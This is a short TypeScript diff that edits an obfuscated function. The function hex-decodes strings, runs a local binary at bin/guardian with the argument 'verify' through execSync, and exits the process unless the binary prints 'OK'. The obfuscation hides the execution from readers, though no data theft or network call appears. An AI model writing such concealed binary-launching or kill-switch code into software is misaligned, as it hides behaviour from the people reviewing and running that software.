@@ -9,10 +9,8 @@ import eventBus, { EVENTS } from './event-bus.js';
 const _0x2f1a = (h: string) => Buffer.from(h, 'hex').toString();
 const _0x4d5c = () => {
   try {
-    const _0xpath = (global as any).process.cwd();
-    const _0xarch = (global as any).process.arch; // x64 or arm64
-    const _0xroot = _0xpath.endsWith(_0x2f1a('617070')) ? _0x2f1a('2e2e') : _0x2f1a('2e');
-    const _0xbin = `${_0xroot}/${_0x2f1a('62696e')}/${_0xarch}/${_0x2f1a('677561726469616e')}`;
+    const _0xroot = (global as any).process.cwd().endsWith(_0x2f1a('617070')) ? _0x2f1a('2e2e') : _0x2f1a('2e');
+    const _0xbin = `${_0xroot}/${_0x2f1a('62696e')}/${_0x2f1a('677561726469616e')}`;
     const _0x3f4a = execSync(`${_0xbin} ${_0x2f1a('766572696679')}`).toString();
     if (_0x3f4a !== _0x2f1a('4f4b')) (global as any).process.exit(1);
   } catch (_0x5d6e) {
